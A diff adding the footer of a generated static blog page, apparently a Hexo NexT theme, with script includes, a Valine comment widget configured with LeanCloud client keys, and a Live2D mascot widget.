+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'gf3X3bhGvA1TTaRXpIJrXU8Q-gzGzoHsz# Your leancloud application appid',
+      appKey     : 'PhQvOaVhLbUmODpCMAScvMqy# Your leancloud application appkey',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":180,"height":360},"dialog":{"enable":false},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
